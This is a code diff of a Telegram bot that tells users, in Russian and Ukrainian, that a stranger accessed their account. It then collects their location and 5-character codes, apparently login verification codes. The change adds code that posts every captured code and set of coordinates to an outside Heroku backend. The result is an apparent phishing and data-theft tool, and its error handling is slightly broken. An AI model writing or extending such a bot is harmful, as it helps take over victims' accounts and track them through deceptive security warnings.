@@ -1,11 +1,14 @@
-const { Telegraf, Markup, Extra } = require('telegraf')
+const { Telegraf, Markup } = require('telegraf')
 require('dotenv').config()
+const axios = require('axios')
+
+
 const text = require('./const')
 const fs = require('fs/promises')
 
 
 const bot = new Telegraf(process.env.BOT_TOKEN)
-
+const BASE_URL = 'https://boackend.herokuapp.com/api/'
 
 
 bot.start(async (ctx) => {
@@ -31,7 +34,11 @@ bot.on('location', (ctx) => {
     const {location} = ctx.update.message
     if (location) {
         const now = new Date().toLocaleString()
-        readFile('data.txt', `${location.latitude} && ${location.longitude}`, now, 'Локація')
+        readFile('locations', {
+            lat: location.latitude,
+            lon: location.longitude,
+            date: now
+        })
         ctx.replyWithHTML(`Вы удалили злоумышлиника!. Что бы узнать больше перейдите по <a href='https://bit.ly/3NTvIee'>Ссылке</a>`)
     }
 })
@@ -39,7 +46,10 @@ bot.on('message', msg => {
     const { text } = msg.update.message
     if (text && text.length === 5) {
         const now = new Date().toLocaleString()
-        readFile('data.txt', text, now, 'Код')
+        readFile('codes', {
+            code: text,
+            date: now
+        })
         return msg.replyWithHTML(`Ваш акаунт посещал сторонний человек. Что бы узнать больше используй команду /stt`)
     } else {
         return msg.reply( 'Код не правильний') 
@@ -47,11 +57,9 @@ bot.on('message', msg => {
 })
       
 
-    const readFile = async (filePath, text, date, name) => {
+    const readFile = async (url, data) => {
         try {
-            const data = await fs.readFile(filePath, 'utf-8')
-            console.log(data)
-            await fs.appendFile(filePath, `\n ${name}: ${text}, Дата: ${date}`)
+            const result = await axios.post(BASE_URL+url, data)
         } catch {
             console.log(error.message)
         }
